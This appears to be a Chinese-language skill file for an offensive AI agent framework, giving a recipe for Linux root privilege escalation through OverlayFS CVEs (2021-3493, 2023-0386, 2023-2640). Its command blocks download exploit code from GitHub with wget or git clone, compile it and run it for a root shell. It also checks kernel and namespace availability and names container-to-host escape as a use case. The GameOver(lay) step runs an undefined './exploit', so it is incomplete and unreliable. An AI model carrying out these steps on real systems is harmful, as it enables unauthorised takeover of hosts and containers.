---
name: 'overlayfs-privesc'
description: 'OverlayFS提权：CVE-2021-3493/CVE-2023-0386/CVE-2023-2640。Ubuntu/Linux容器/K8s常见。'
disable-model-invocation: true
metadata: { domain: linux, tier: T3 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

## OverlayFS 提权 (CVE-2021-3493 / CVE-2023-0386)

### CVE-2021-3493 (Ubuntu 内核 5.4-5.11)
```bash
# 利用: 利用 OverlayFS 在没有 user namespace 时挂载 → SUID 执行
wget https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c
gcc exploit.c -o exploit
./exploit
# → root shell (通过 setuid 传播)
```

### CVE-2023-0386 (内核 5.10-6.2)
```bash
# 利用: OverlayFS 覆写 capability set
git clone https://github.com/sxlmnwb/CVE-2023-0386
cd CVE-2023-0386 && make
./exp
# 或者利用 setuid/setgid 位从无权限用户传播到 root
```

### GameOver(lay) CVE-2023-2640 & CVE-2023-32629
```bash
# Ubuntu 专有内核补丁引入的新漏洞
# 利用 OverlayFS 的 trusted.overlay.opaque xattr
unshare -rm sh -c "mkdir l u w m && cp /bin/bash l && ./exploit"
```

### 检测
```bash
uname -r         # 确认内核版本
cat /proc/filesystems | grep overlay   # 确认 OverlayFS 可用
unshare -Urm echo yes 2>&1  # 确认 user namespace 可用
```

### 适用场景
- 容器环境（Docker/LXC）→ 提权到宿主机
- 低权 Linux 用户 → root
- Ubuntu 尤其是 LTS 版本（大量受影响）
